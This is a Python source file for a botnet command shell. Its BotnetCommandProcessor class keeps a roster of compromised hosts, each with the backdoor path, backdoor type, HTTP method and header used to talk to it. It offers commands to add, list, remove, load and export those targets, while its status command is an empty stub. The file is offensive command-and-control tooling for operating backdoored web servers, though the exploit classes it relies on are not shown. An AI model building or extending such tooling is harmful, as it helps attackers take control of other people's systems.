import json  # parse file and export
from time import time  # export timestamp
from pathlib import Path  # parse file and export
from Exceptions import *
from CommandProcessor import CommandProcessor
"""
@brief The BotnetCommandProcessor class is a class that accepts commands to be
        executed on a botnet. It is used to set up the environment and exploit
        variables for a botnet while also executing commands on the entire
        botnet.
        Inherits from the CommandProcessor class.
"""
class BotnetCommandProcessor(CommandProcessor):
    def __init__(self, classes):
        self.exploitClasses = classes
        self.targets = []
        super().__init__()
        self.commands["add"] = {
            "method": self.__add,
            "description": "Add a target to the list of targets.",
            "usage": ("add name host path type method header\n"
                        "    name: the name of the target.\n"
                        "    host: the hostname of the target.\n"
                        "    path: the path of the backdoor on the target.\n"
                        "    type: the type of backdoor on the target.\n"
                        "    method: the HTTP method for the backdoor.\n"
                        "    header: the HTTP header to communicate over.")
        }
        self.commands["list"] = {
            "method": self.__list,
            "description": "List all the targets.",
            "usage": "list"
        }
        self.commands["remove"] = {
            "method": self.__remove,
            "description": "Remove a target from the botnet.",
            "usage": ("remove names ...\n"
                      "    names: a space seperated list of the names of the"
                      " targets to be removed.")
        }
        self.commands["load"] = {
            "method": self.__load,
            "description": "Load targets from file.",
            "usage": ("load path\n"
                      "    path: the path to the a JSON file containing the "
                      "targets, relative to the path this script is ran.")
        }
        self.commands["export"] = {
            "method": self.__export,
            "description": "Export a timestamped file with all the targets.",
            "usage": "export\n"
        }
        self.commands["status"] = {
            "method": self.__status,
            "description": "Get the status of all the target(s).",
            "usage": ("export [name]...\n"
                      "    name: a space seperated list of target names")
        }
        
    """
    @brief Add a target to the list of targets.
    @throw CommandException if host is malformatted.
    """
    def __add(self, options: str):
        if options.count(" ") != 5:
            raise CommandException("Incorrect usage. "
                                   "Run 'help add' for usage.")
        name, host, path, target_type, method, header = options.split(" ")
        if name == "*":
            print("'*' name not allowed.")
        if name in map(lambda host : host["name"], self.targets):
            raise CommandException(f"'{name}' already in targets.")
        
        typeClass = next((t for t in self.exploitClasses if t.get_name().upper()
                           == target_type.upper()), None)
        if not typeClass:
            raise CommandException(f"'{name}' is of an unsupported type.")
        
        processor = None
        try:
            processor = typeClass(host, path, method, header)
        except CommandException as e:
            print(f"{name}: {str(e)}")

        self.targets.append({
            "name": name,
            "host": host,
            "path": path,
            "type": target_type,
            "method": method,
            "header": header,
            "processor": processor
        })

    """
    @brief List all of the hosts
    @throw CommandException if there are not targets.
    """
    def __list(self, options: str):
        if len(self.targets) == 0:
            raise CommandException("No targets added.")

        print(self.targets[0]["name"])
        print(f"{self.targets[0]['host']}{self.targets[0]['path']}")
        print(f"Type: {self.targets[0]['type']}")
        print(f"Method: {self.targets[0]['method']}")
        print(f"Header: {self.targets[0]['header']}")
        for target in self.targets[1:]:
            print("-" * 80)
            print(target["name"])
            print(f"{target['host']}{target['path']}")
            print(f"Type: {target['type']}")
            print(f"Method: {target['method']}")
            print(f"Header: {target['header']}")
        print(f"\nTotal: {len(self.targets)}")

    """
    @brief Remove targets from the list.
    @param options a list of targets to be removed (space seperated).
    @throw CommandException if there are no arguments.
    """
    def __remove(self, options: str):
        if len(options) == 0:
            raise CommandException("Nothing to be removed.")
        names = options.split(" ")

        if "*" in names:
            choice = input("Remove all targets? [y/N] ")
            if not choice.lower().startswith('y'):
                return
            self.targets = []
            return
        
        for name in names:
            target = next((t for t in self.targets if t["name"] == name), None)
            if target:
                print(f"Removing '{name}'.")
                self.targets.remove(target)
            else:
                print(f"'{name}' not found in targets.")
    
    """
    @brief Load targets from a file.
    @param options the path to the file.
    @throw CommandException if the file couldn't be targets couldn't be loaded.
    """
    def __load(self, options: str):
        if len(options) == 0:
            raise CommandException("No path given.")
        path = Path(options)
        if path.exists() and path.is_file():
            try:
                data = json.load(open(path))
                for target in data["targets"]:
                    try:
                        self.__add((f"{target['name']} "
                                    f"{target['host']} "
                                    f"{target['path']} "
                                    f"{target['type']} "
                                    f"{target['method']} "
                                    f"{target['header']}"))
                    except CommandException as e:
                        print(str(e))
            except:
                raise CommandException("Could not parse file.")
        else:
            raise CommandException("File does not exist.")

    """
    @brief Exports targets as JSON onto disk with timestamp.
    @param options not used.
    @post a file named "botnet-[unix_timestamp].json" is saved to disk in the
            same directory that the script is ran in.
    @throw CommandException if the targets could not be saved.
    """
    def __export(self, options: str):
        timestamp = int(time())
        outTargets = []
        for target in self.targets:
            outTarget = {}
            for key in target.keys():
                if key != "processor":
                    outTarget[key] = target[key]
            outTargets.append(outTarget)
        out = {
            "targets": outTargets
        }
        with open(f"botnet-{timestamp}.json", 'w') as f:
            json.dump(out, f, ensure_ascii=False, indent=4)

    """
    @brief Get the status of the target(s)
    @param options a comma seperated list of the targets, or nothing.
    """
    def __status(self, options: str):
        names = []
        if len(options) == 0:
            names = map(lambda host : host["name"], self.targets)
        else:
            names = options.split(" ")

        for name in names:
            pass
            
    """
    @brief See base class for details.
    """
    def _Base__get_prefix(self):
        return "botnet > "
    